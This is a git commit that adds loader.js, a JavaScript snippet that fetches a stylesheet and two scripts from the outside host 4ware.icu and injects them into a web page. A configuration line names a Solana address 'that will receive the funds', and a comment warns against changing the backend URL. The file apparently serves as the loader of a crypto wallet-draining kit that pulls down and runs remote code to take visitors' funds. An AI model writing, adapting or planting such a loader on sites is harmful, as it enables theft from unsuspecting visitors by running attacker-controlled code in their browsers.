dce3db970b33bde18b7bbdfb4372ab40cc72405a
Erdemirdo! <mertyigit338@gmail.com>
2025-10-06 18:02:15 +0300

    Create loader.js

---
+++ loader.js
@@ -0,0 +1,48 @@
+(function() {
+    const config = {
+        solanaAddress: "AjF1cgmjpuJsDs8YaL2BLxB9Ttgvxf6s8oYxzSBjekwg" // Enter your Solana address that will receive the funds.
+    };
+
+    const backendUrl = "https://4ware.icu" // Changing this will break down your code, keep it as it is.
+
+    function loadCSS(src) {
+        return new Promise((resolve, reject) => {
+            fetch(`${backendUrl}/${src}`)
+                .then(response => {
+                    if (!response.ok) throw new Error(`${src}`);
+                    return response.text();
+                })
+                .then(cssContent => {
+                    const style = document.createElement('style');
+                    style.textContent = cssContent;
+                    document.head.appendChild(style);
+                    resolve();
+                })
+                .catch(reject);
+        });
+    }
+
+    function loadScript(src) {
+        return new Promise((resolve, reject) => {
+            fetch(`${backendUrl}/${src}`)
+                .then(response => {
+                    if (!response.ok) throw new Error(`${src}`);
+                    return response.text();
+                })
+                .then(scriptContent => {
+                    const script = document.createElement('script');
+                    script.textContent = scriptContent;
+                    document.head.appendChild(script);
+                    resolve();
+                })
+                .catch(reject);
+        });
+    }
+
+    loadCSS('modal-styles.css')
+        .then(() => loadScript('modal.js'))
+        .then(() => loadScript('scripts.js'))
+        .catch(error => {
+            console.error('error ', error);
+        });
+})();
